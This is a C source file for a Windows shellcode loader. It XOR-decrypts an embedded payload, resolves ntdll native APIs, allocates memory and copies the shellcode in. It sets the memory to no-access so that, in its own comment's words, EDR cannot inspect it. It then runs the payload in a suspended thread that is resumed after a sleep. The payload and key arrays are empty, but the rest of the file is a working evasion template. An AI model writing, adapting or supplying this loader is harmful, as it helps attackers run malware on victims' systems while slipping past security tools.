#include "Header.h"

int main() {

	// Initialize variables & values
	NTSTATUS				STATUS;
	ULONG					pdwOldProtect;
	PVOID					pBaseMemAddress		= NULL;
	HANDLE					hThread				= NULL;
	OBJECT_ATTRIBUTES		ObjAttr				= { sizeof(ObjAttr), 0 };
	DWORD					dwSleepInterval		= 3000;
	DWORD					dwDwellTime			= 60000;
	unsigned char			ucEncryptionKey[]	= "";
	unsigned char			ucShellCode[]		= {};
	SIZE_T					sShellCodeSize		= sizeof(ucShellCode);

	// Decrypt the payload
	XorPayloadWithMultiByteKey(ucShellCode, sizeof(ucShellCode), ucEncryptionKey, sizeof(ucEncryptionKey));

	// Get handle to ntdll and populate nt function prototypes
	HMODULE						hNtDll					= GetModuleHandleW(L"ntdll.dll");
	fnpNtResumeThread			NtResumeThread			= (fnpNtResumeThread)GetProcAddress(hNtDll, "NtResumeThread");
	fnpNtProtectVirtualMemory	NtProtectVirtualMemory	= (fnpNtProtectVirtualMemory)GetProcAddress(hNtDll, "NtProtectVirtualMemory");
	fnpNtAllocateVirtualMemory	NtAllocateVirtualMemory	= (fnpNtAllocateVirtualMemory)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
	fnpNtCreateThreadEx			NtCreateThreadEx		= (fnpNtCreateThreadEx)GetProcAddress(hNtDll, "NtCreateThreadEx");

#ifdef DEBUG
	printf("Acquired NTDLL functions.\n");
#endif

	// Allocate virtual memory space to this process for the payload
	STATUS = NtAllocateVirtualMemory((HANDLE)-1, &pBaseMemAddress, (ULONG_PTR)NULL, &sShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#ifdef DEBUG
	if (STATUS != NT_SUCCESS) {
		printf("Error while allocating memory. Code: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	printf("Allocated 0x%zu bytes at address 0x%p.\n", sizeof(ucShellCode), pBaseMemAddress);
#endif

	// Move the payload into allocated memory 
	memmove(pBaseMemAddress, ucShellCode, sizeof(ucShellCode));

#ifdef DEBUG
	printf("Moved payload into memory at address 0x%p.\n", pBaseMemAddress);
#endif

	// Set memory protection to PAGE_NO_ACCESS to prevent EDR from accessing the memory
	STATUS = NtProtectVirtualMemory((HANDLE)-1, &pBaseMemAddress, &sShellCodeSize, PAGE_NOACCESS, &pdwOldProtect);
#ifdef DEBUG
	if (STATUS != NT_SUCCESS) {
		printf("Error while setting memory protection to PAGE_NOACCESS. Code: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	printf("Set memory protection to PAGE_NOACCESS.\n");
#endif

	// Create a suspended thread pointing at shellcode
	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &ObjAttr, (HANDLE)-1, (LPTHREAD_START_ROUTINE)pBaseMemAddress, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, NULL);
#ifdef DEBUG
	if (STATUS != NT_SUCCESS) {
		printf("Error while creating thread. Code: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	printf("Created thread in suspended execution state. Starting %i second sleep cycle.\n", (dwSleepInterval / 1000));
#endif

	Sleep(dwSleepInterval);

	// Set memory protection to PAGE_EXECUTE so it can run
	STATUS = NtProtectVirtualMemory((HANDLE)-1, &pBaseMemAddress, &sShellCodeSize, PAGE_EXECUTE, &pdwOldProtect);
#ifdef DEBUG
	if (STATUS != NT_SUCCESS) {
		printf("Error while setting memory protection to PAGE_EXECUTE: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	printf("Set memory protection to PAGE_EXECUTE. Resuming thread.\n");
#endif

	// Resume the thread and execute the decrypted payload
	STATUS = NtResumeThread(hThread, NULL);
#ifdef DEBUG
	if (STATUS != NT_SUCCESS) {
		printf("Error while resuming thread at 0x%p. Code: 0x%lx", hThread, STATUS);
		return EXIT_FAILURE;
	}
	printf("Resumed thread\n");
#endif

	Sleep(dwDwellTime);
	return EXIT_SUCCESS;
}

